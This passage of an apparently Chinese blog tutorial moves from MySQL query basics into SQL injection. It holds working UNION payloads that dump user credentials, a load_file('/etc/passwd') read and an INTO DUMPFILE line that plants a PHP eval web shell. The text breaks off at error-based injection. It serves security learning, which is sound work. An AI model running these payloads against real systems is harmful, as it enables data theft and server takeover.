class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure><p>IS NULL 条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE department IS NULL;</span><br></pre></td></tr></table></figure><p>IS NOT NULL 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE email IS NOT NULL;</span><br></pre></td></tr></table></figure><h5 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a><strong>聚合函数</strong></h5><ul><li><strong>count() ：统计记录的条数；</strong></li><li><strong>sum()：计算字段的值的总和；</strong></li><li><strong>avg()：可以求出表中某个字段取值的平均值；</strong></li><li><strong>max()：可以求出表中某个字段取值的最大值；</strong></li><li><strong>min()：可以求出表中某个字段取值的最小值。</strong></li></ul><h5 id="模糊查询（LIKE）"><a href="#模糊查询（LIKE）" class="headerlink" title="模糊查询（LIKE）"></a>模糊查询（LIKE）</h5><p><code>LIKE</code> 语句是 MySQL 中用于模糊匹配查询的工具。通过使用通配符（<code>%</code> 和 <code>_</code>），我们可以灵活地查找符合特定模式的字符串。这在对文本进行搜索时非常有用。常搭配<strong>通配符</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">LIKE</span> <span class="string">&#x27;模式&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="分页查询（LIMIT）"><a href="#分页查询（LIMIT）" class="headerlink" title="分页查询（LIMIT）"></a>分页查询（LIMIT）</h5><p>MySQL 的分页通常使用 <strong><code>LIMIT</code> 和 <code>OFFSET</code> 来指定返回数据的数量和起始位置</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 每页记录数 <span class="keyword">OFFSET</span> 偏移量;</span><br></pre></td></tr></table></figure><p>或更常见的简化语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure><ul><li><strong>LIMIT</strong>：指定返回的记录数。</li><li><strong>OFFSET</strong>：指定开始返回的记录位置，通常和 <code>LIMIT</code> 搭配使用。</li></ul><h5 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h5><p>在 SQL 查询中，<code>ORDER BY</code> 子句用于对查询结果集按照指定列进行排序，以便得到更直观的输出。排序可以是升序或降序。默认情况下，<code>ORDER BY</code> 会对数据进行升序排序；若想使用降序，则需显式指定。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">1</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], 列名<span class="number">2</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...;</span><br></pre></td></tr></table></figure><ul><li><strong>ASC</strong>：升序排列（默认）；</li><li><strong>DESC</strong>：降序排列；</li></ul><h5 id="分组查询（GROUP-BY）"><a href="#分组查询（GROUP-BY）" class="headerlink" title="分组查询（GROUP BY）"></a>分组查询（GROUP BY）</h5><p>在 MySQL 中，<code>GROUP BY</code> 语句<strong>用于将查询结果中的行按指定列分组，并对每个分组进行聚合操作。</strong> <code>GROUP BY</code> 经常与聚合函数（如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等）一起使用，用于计数、求和、求平均值，或其他分组计算。<code>HAVING</code> 子句用于筛选分组后的结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 聚合函数(列<span class="number">2</span>)</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>列1</strong>：需要分组的字段。</li><li>**聚合函数(列2)**：对每个分组应用的聚合函数，如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等。</li><li><strong>GROUP BY</strong>：指定按哪一个或多个列分组。</li></ul><h5 id="合并查询结果（UNION）"><a href="#合并查询结果（UNION）" class="headerlink" title="合并查询结果（UNION）"></a>合并查询结果（UNION）</h5><p>在 MySQL 中，<code>UNION</code> 操作符用于合并<strong>两个</strong>或<strong>多个</strong> <code>SELECT</code> 查询的结果，并将它们组合成一个结果集。<code>UNION</code> 可以帮助我们将多张表的结果汇总，并且自动去除重复行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件]</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">2</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><ul><li><strong>SELECT</strong>：用于定义查询语句，指定要查询的列和表。</li><li><strong>UNION</strong>：用于将多个查询的结果合并在一起。</li><li><strong>WHERE</strong>：可选项，可以对每个查询设置条件。</li></ul><blockquote><p><strong>注意</strong>：每个 <code>SELECT</code> 查询的列数和数据类型必须一致，以便在结果中按列正确合并。</p></blockquote><h5 id="关联查询（join）"><a href="#关联查询（join）" class="headerlink" title="关联查询（join）"></a>关联查询（join）</h5><p>在 MySQL 中，<code>JOIN</code> 操作<strong>用于从多个表中查询相关联的数据。</strong> 通过 <code>JOIN</code> 可以把符合条件的数据从不同的表合并在一起，使得复杂的数据查询和关联分析更加便捷。</p><p>MySQL 中常见的 <code>JOIN</code> 类型有：**<code>INNER JOIN</code>、<code>LEFT JOIN</code>、<code>RIGHT JOIN</code> 和 <code>FULL JOIN</code>（不直接支持）**，不同类型的 <code>JOIN</code> 会根据需要获取交集、左连接、右连接或完整的并集数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 表<span class="number">1.</span>列名, 表<span class="number">2.</span>列名, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line"><span class="keyword">JOIN</span> 表<span class="number">2</span></span><br><span class="line"><span class="keyword">ON</span> 表<span class="number">1.</span>关联列 <span class="operator">=</span> 表<span class="number">2.</span>关联列;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>JOIN</strong>：表示连接操作。</li><li><strong>ON</strong>：用于指定两个表之间的关联条件。</li><li><strong>表1.列名</strong> 和 <strong>表2.列名</strong>：用于选择需要的列。</li></ul></blockquote><ul><li><h4 id="INNER-JOIN（内连接）"><a href="#INNER-JOIN（内连接）" class="headerlink" title="INNER JOIN（内连接）"></a><strong>INNER JOIN（内连接）</strong></h4><p><code>INNER JOIN</code> 仅返回两个表中匹配的记录，即满足条件的交集部分。如果没有匹配的记录，不会出现在结果中。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure></li><li><h4 id="LEFT-JOIN（左连接）"><a href="#LEFT-JOIN（左连接）" class="headerlink" title="LEFT JOIN（左连接）"></a>LEFT JOIN（左连接）</h4><p><code>LEFT JOIN</code> 会返回左表中的所有记录，即使右表中没有对应匹配的记录。对于没有匹配的右表记录，用 <code>NULL</code> 填充。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure></li><li><h4 id="RIGHT-JOIN（右连接）"><a href="#RIGHT-JOIN（右连接）" class="headerlink" title="RIGHT JOIN（右连接）"></a>RIGHT JOIN（右连接）</h4><p><code>RIGHT JOIN</code> 和 <code>LEFT JOIN</code> 类似，但会<strong>返回右表中的所有记录</strong>，即使左表中没有匹配记录。对于没有匹配的左表记录，用 <code>NULL</code> 填充。</p></li><li><h4 id="CROSS-JOIN（笛卡尔积）"><a href="#CROSS-JOIN（笛卡尔积）" class="headerlink" title="CROSS JOIN（笛卡尔积）"></a>CROSS JOIN（笛卡尔积）</h4><p><code>CROSS JOIN</code> 不需要 <code>ON</code> 条件，它会将左表和右表的所有组合列出，适合在需要笛卡尔积时使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments;</span><br></pre></td></tr></table></figure><blockquote><p>假设 <code>employees</code> 表有 4 条记录，<code>departments</code> 表有 3 条记录，则结果会包含 4 × 3 &#x3D; 12 条记录。</p></blockquote></li></ul><h5 id="子查询与嵌套查询"><a href="#子查询与嵌套查询" class="headerlink" title="子查询与嵌套查询"></a>子查询与嵌套查询</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span></span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> 列名</span><br><span class="line">    <span class="keyword">FROM</span> 另一表</span><br><span class="line">    <span class="keyword">WHERE</span> 条件</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src="/archives/ef8ae29c/QQ%E6%88%AA%E5%9B%BE20240325161309.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>SQL注入</strong>指攻击者通过在输入字段中插入恶意的SQL代码，干扰或篡改数据库的正常查询逻辑，从而获取、篡改或删除数据库中的数据。</p><p>SQL注入漏洞产生的两个条件：</p><ul><li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li><li>参数带入数据库查询：传入的参数拼接到SQL语句并带入数据库查询。</li></ul><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>绕过登录验证：使用万能密码登录网站后台等。</li><li>获取敏感数据：获取网站管理员帐号、密码等。</li><li>文件系统操作：列目录，读取、写入文件等。</li><li>注册表操作：读取、写入、删除注册表等。</li><li>执行系统命令：远程执行命令。</li></ul><h3 id="SQL注入判断及注入点分类"><a href="#SQL注入判断及注入点分类" class="headerlink" title="SQL注入判断及注入点分类"></a>SQL注入判断及注入点分类</h3><p>判断是否存在注入：</p><ul><li>通过改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。</li><li>通过添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。</li></ul><p>闭合符判断：</p><p>通过使用<code>\</code>来判断。<code>\</code>后面的跟着的是什么字符，那么它的闭合字符就是什么，若是没有，就为数字型。</p><h2 id="注入常用参数"><a href="#注入常用参数" class="headerlink" title="注入常用参数"></a>注入常用参数</h2><h3 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h3><table><thead><tr><th>00100000</th><th>32</th><th>20</th><th>(Space)</th><th>空格</th></tr></thead><tbody><tr><td>00100001</td><td>33</td><td>21</td><td>!</td><td></td></tr><tr><td>00100010</td><td>34</td><td>22</td><td>“</td><td></td></tr><tr><td>00100011</td><td>35</td><td>23</td><td>#</td><td></td></tr><tr><td>00100100</td><td>36</td><td>24</td><td>$</td><td></td></tr><tr><td>00100101</td><td>37</td><td>25</td><td>%</td><td></td></tr><tr><td>00100110</td><td>38</td><td>26</td><td>&amp;</td><td></td></tr><tr><td>00100111</td><td>39</td><td>27</td><td>‘</td><td></td></tr><tr><td>00101000</td><td>40</td><td>28</td><td>(</td><td></td></tr><tr><td>00101001</td><td>41</td><td>29</td><td>)</td><td></td></tr><tr><td>00101010</td><td>42</td><td>2A</td><td>*</td><td></td></tr><tr><td>00101011</td><td>43</td><td>2B</td><td>+</td><td></td></tr><tr><td>00101100</td><td>44</td><td>2C</td><td>,</td><td></td></tr><tr><td>00101101</td><td>45</td><td>2D</td><td>-</td><td></td></tr><tr><td>00101110</td><td>46</td><td>2E</td><td>.</td><td></td></tr><tr><td>00101111</td><td>47</td><td>2F</td><td>&#x2F;</td><td></td></tr><tr><td>00110000</td><td>48</td><td>30</td><td>0</td><td></td></tr><tr><td>00110001</td><td>49</td><td>31</td><td>1</td><td></td></tr><tr><td>00110010</td><td>50</td><td>32</td><td>2</td><td></td></tr><tr><td>00110011</td><td>51</td><td>33</td><td>3</td><td></td></tr><tr><td>00110100</td><td>52</td><td>34</td><td>4</td><td></td></tr><tr><td>00110101</td><td>53</td><td>35</td><td>5</td><td></td></tr><tr><td>00110110</td><td>54</td><td>36</td><td>6</td><td></td></tr><tr><td>00110111</td><td>55</td><td>37</td><td>7</td><td></td></tr><tr><td>00111000</td><td>56</td><td>38</td><td>8</td><td></td></tr><tr><td>00111001</td><td>57</td><td>39</td><td>9</td><td></td></tr><tr><td>00111010</td><td>58</td><td>3A</td><td>:</td><td></td></tr><tr><td>00111011</td><td>59</td><td>3B</td><td>;</td><td></td></tr><tr><td>00111100</td><td>60</td><td>3C</td><td>&lt;</td><td></td></tr><tr><td>00111101</td><td>61</td><td>3D</td><td>&#x3D;</td><td></td></tr><tr><td>00111110</td><td>62</td><td>3E</td><td>&gt;</td><td></td></tr><tr><td>00111111</td><td>63</td><td>3F</td><td>?</td><td></td></tr><tr><td>01000000</td><td>64</td><td>40</td><td>@</td><td></td></tr><tr><td>01000001</td><td>65</td><td>41</td><td>A</td><td></td></tr><tr><td>01000010</td><td>66</td><td>42</td><td>B</td><td></td></tr><tr><td>01000011</td><td>67</td><td>43</td><td>C</td><td></td></tr><tr><td>01000100</td><td>68</td><td>44</td><td>D</td><td></td></tr><tr><td>01000101</td><td>69</td><td>45</td><td>E</td><td></td></tr><tr><td>01000110</td><td>70</td><td>46</td><td>F</td><td></td></tr><tr><td>01000111</td><td>71</td><td>47</td><td>G</td><td></td></tr><tr><td>01001000</td><td>72</td><td>48</td><td>H</td><td></td></tr><tr><td>01001001</td><td>73</td><td>49</td><td>I</td><td></td></tr><tr><td>01001010</td><td>74</td><td>4A</td><td>J</td><td></td></tr><tr><td>01001011</td><td>75</td><td>4B</td><td>K</td><td></td></tr><tr><td>01001100</td><td>76</td><td>4C</td><td>L</td><td></td></tr><tr><td>01001101</td><td>77</td><td>4D</td><td>M</td><td></td></tr><tr><td>01001110</td><td>78</td><td>4E</td><td>N</td><td></td></tr><tr><td>01001111</td><td>79</td><td>4F</td><td>O</td><td></td></tr><tr><td>01010000</td><td>80</td><td>50</td><td>P</td><td></td></tr><tr><td>01010001</td><td>81</td><td>51</td><td>Q</td><td></td></tr><tr><td>01010010</td><td>82</td><td>52</td><td>R</td><td></td></tr><tr><td>01010011</td><td>83</td><td>53</td><td>S</td><td></td></tr><tr><td>01010100</td><td>84</td><td>54</td><td>T</td><td></td></tr><tr><td>01010101</td><td>85</td><td>55</td><td>U</td><td></td></tr><tr><td>01010110</td><td>86</td><td>56</td><td>V</td><td></td></tr><tr><td>01010111</td><td>87</td><td>57</td><td>W</td><td></td></tr><tr><td>01011000</td><td>88</td><td>58</td><td>X</td><td></td></tr><tr><td>01011001</td><td>89</td><td>59</td><td>Y</td><td></td></tr><tr><td>01011010</td><td>90</td><td>5A</td><td>Z</td><td></td></tr><tr><td>01011011</td><td>91</td><td>5B</td><td>[</td><td></td></tr><tr><td>01011100</td><td>92</td><td>5C</td><td>\</td><td></td></tr><tr><td>01011101</td><td>93</td><td>5D</td><td>]</td><td></td></tr><tr><td>01011110</td><td>94</td><td>5E</td><td>^</td><td></td></tr><tr><td>01011111</td><td>95</td><td>5F</td><td>_</td><td></td></tr><tr><td>01100000</td><td>96</td><td>60</td><td>&#96;</td><td></td></tr><tr><td>01100001</td><td>97</td><td>61</td><td>a</td><td></td></tr><tr><td>01100010</td><td>98</td><td>62</td><td>b</td><td></td></tr><tr><td>01100011</td><td>99</td><td>63</td><td>c</td><td></td></tr><tr><td>01100100</td><td>100</td><td>64</td><td>d</td><td></td></tr><tr><td>01100101</td><td>101</td><td>65</td><td>e</td><td></td></tr><tr><td>01100110</td><td>102</td><td>66</td><td>f</td><td></td></tr><tr><td>01100111</td><td>103</td><td>67</td><td>g</td><td></td></tr><tr><td>01101000</td><td>104</td><td>68</td><td>h</td><td></td></tr><tr><td>01101001</td><td>105</td><td>69</td><td>i</td><td></td></tr><tr><td>01101010</td><td>106</td><td>6A</td><td>j</td><td></td></tr><tr><td>01101011</td><td>107</td><td>6B</td><td>k</td><td></td></tr><tr><td>01101100</td><td>108</td><td>6C</td><td>l</td><td></td></tr><tr><td>01101101</td><td>109</td><td>6D</td><td>m</td><td></td></tr><tr><td>01101110</td><td>110</td><td>6E</td><td>n</td><td></td></tr><tr><td>01101111</td><td>111</td><td>6F</td><td>o</td><td></td></tr><tr><td>01110000</td><td>112</td><td>70</td><td>p</td><td></td></tr><tr><td>01110001</td><td>113</td><td>71</td><td>q</td><td></td></tr><tr><td>01110010</td><td>114</td><td>72</td><td>r</td><td></td></tr><tr><td>01110011</td><td>115</td><td>73</td><td>s</td><td></td></tr><tr><td>01110100</td><td>116</td><td>74</td><td>t</td><td></td></tr><tr><td>01110101</td><td>117</td><td>75</td><td>u</td><td></td></tr><tr><td>01110110</td><td>118</td><td>76</td><td>v</td><td></td></tr><tr><td>01110111</td><td>119</td><td>77</td><td>w</td><td></td></tr><tr><td>01111000</td><td>120</td><td>78</td><td>x</td><td></td></tr><tr><td>01111001</td><td>121</td><td>79</td><td>y</td><td></td></tr><tr><td>01111010</td><td>122</td><td>7A</td><td>z</td><td></td></tr><tr><td>01111011</td><td>123</td><td>7B</td><td>{</td><td></td></tr><tr><td>01111100</td><td>124</td><td>7C</td><td>|</td><td></td></tr><tr><td>01111101</td><td>125</td><td>7D</td><td>}</td><td></td></tr><tr><td>01111110</td><td>126</td><td>7E</td><td>~</td><td></td></tr><tr><td>01111111</td><td>127</td><td>7F</td><td>DEL (Delete)</td><td>删除</td></tr></tbody></table><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li><p><strong>查看数据</strong></p><p><code>version()</code>:查看MySQL版本</p><p><code>user()</code>:数据库用户名</p><p><code>current_user()</code>:当前用户名</p><p><code>database()</code>:数据库名</p><p><code>@@datadir</code>:数据库路径</p><p><code>system_ user()</code>:系统用户名</p><p><code>@@version_compile_os</code>:操作系统版本</p></li><li><p><strong>字符串拼接函数</strong></p><p><code>concat(str1,str2,...)</code>:没有分隔符的连接字符</p><p><code>concat_ws(separator,str1,str2)</code>:含有分隔符的连接字符串</p><p><code>group_concat(str1,str2,...)</code>:连接一个组的所有字符串，并以逗号分割每一条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’ --+</span><br></pre></td></tr></table></figure><blockquote><p>会返回security库中的所有表并以逗号分隔开</p></blockquote></li><li><p><strong>延时函数</strong></p><p><code>sleep( )</code>:睡眠时间为指定的秒数</p></li><li><p><strong>字符串截取函数</strong></p><p><code>length()</code>:返回字符串的长度</p><blockquote><p>如length(database())会返回数据库名的长度</p></blockquote><p><code>left(str,num)</code>:对字符串str从左开始数起，返回num个字符</p><blockquote><p>如rleft(database(),2)&#x3D;se</p></blockquote><p><code>right(str,num)</code>:对字符串str从右开始数起，返回num个字符（与left相反）</p><p><code>substr(str,num1,num2)</code>:截取字符串，从起始位置num1开始，截取长度为num2</p><blockquote><p>**substr(database(),1,3)**从数据库第一位开始截取，截取三个字符</p></blockquote><p><code>substring( )</code>:与<code>substr()</code>一样</p><p><code>mid(str,sum1,sum2)</code>:与<code>substr()</code>一样</p></li><li><p><strong>编码函数</strong></p><p><code>ord()</code>:返回字符串第一个字符的ASCII值</p><blockquote><p>如<code>ord(&#39;a&#39;)</code>会返回97</p></blockquote><p><code>ascii()</code>:返回字符串第一个字符的ASCII值,与<code>ord()</code>一样</p><p><code>hex()</code>:将字符串转换为十六进制</p><p><code>unhex()</code>:hex的反向操作</p><p><code>md5()</code>:返回MD5值</p></li><li><p><strong>转义函数及配置</strong></p><p><code>addslashes()</code>:返回在预定义字符之前添加反斜杠的字符串。</p><blockquote><p>预定义字符：单引号<code>&#39;</code>,双引号<code>&quot;</code>,反斜杠<code>\</code>,NULL</p></blockquote><p><code>magic_quotes_gpc</code>:解析用户提交的数据，如有：post、get、cookie过来的数据增加转义符“\” 以确保这些数据不会引起程序错误,可用于防护SQL</p><blockquote><p><strong>PHP 5.4.0 版本之后被废弃，并在 PHP 7.0.0 中彻底移除。</strong></p></blockquote><p><code>mysql_real_escape_string():</code>用于在 MySQL 查询中转义特殊字符,返回转义后的字符串</p></li><li><p><strong>读写文件函数</strong></p><p><code>load_file()</code>:用于读取文件，返回文件内容作为字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#读取文件/etc/passwd （还可以查看其他文件，需要相应的权限）</span><br><span class="line">#路径可以为这两种格式&quot;\\&quot;与&quot;/&quot;，</span><br><span class="line">union select 1,2,load_file(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure><p><code>into dumpfile</code>:用于写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在/var/www/html新建文件a.php，在将一句话木马写入</span><br><span class="line">union select 1,2,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into dumpfile &#x27;/var/www/html/a.php&#x27; </span><br></pre></td></tr></table></figure><p><code>into outfile</code>:与<code>into dumpfile</code>用法一样</p></li><li><p><strong>其他函数</strong></p><p><code>if(true,t,f)</code>:用于判断</p><p><code>floor()</code>:向下取整</p><blockquote><p>floor(3.8)&#x3D;3</p></blockquote><p><code>count()</code>：返回当前列的数量</p><p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p><p><code>exp()</code>:以e为底的指数函数</p><blockquote><p>~0表示对0进行按位取反</p></blockquote><p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p><ul><li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>XPath_string (Xpath格式的字符串)</li><li>new_value，String格式，替换查找到的符合条件的数据</li></ul><p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p></li></ul><h3 id="常用库表"><a href="#常用库表" class="headerlink" title="常用库表"></a>常用库表</h3><p><img src="/archives/ef8ae29c/QQ%E6%88%AA%E5%9B%BE20231220193939.png" alt="img"></p><ul><li><strong>information_schema.schemata：记录数据库信息的表</strong> </li><li><strong>information_schema.tables：记录表名信息的表</strong> </li><li><strong>information_schema.columns：记录列名信息的表</strong> </li><li><strong>schema_name 数据库名</strong> </li><li><strong>table_name 表名</strong> </li><li><strong>column_name 列名</strong> </li><li><strong>table_schema 数据库名</strong></li></ul><p>例：</p><blockquote><p>查数据库名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure><blockquote><p>查表名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>查数据：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from security.users;</span><br></pre></td></tr></table></figure><blockquote><p>查列名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>原理：通过使用union关键字，对两个select语句进行联合查询；使用前提是<strong>前后查询的语句必须拥有相同数量的列</strong>（字段），列也必需拥有相同的数据类型。</p><p>适用情况：<strong>页面存在回显</strong>。</p><p>注入流程：</p><ul><li><p><strong>判断注入点</strong></p></li><li><p><strong>判断字段数</strong></p><p>因为union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样。所以要通过order by判断字段数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断回显点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>将id值改为111是为了让前面查询的语句为空，无显示，然后后面查询语句查询的元素显示出来。</p></blockquote></li><li><p><strong>查找库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>查找表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><blockquote><p>group_concat()函数将所有查询的表名连在一起成为一条数据。</p></blockquote></li><li><p><strong>查找列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 111&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>查找字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>页面没有内容回显，那么我们可以通过构造特定的SQL 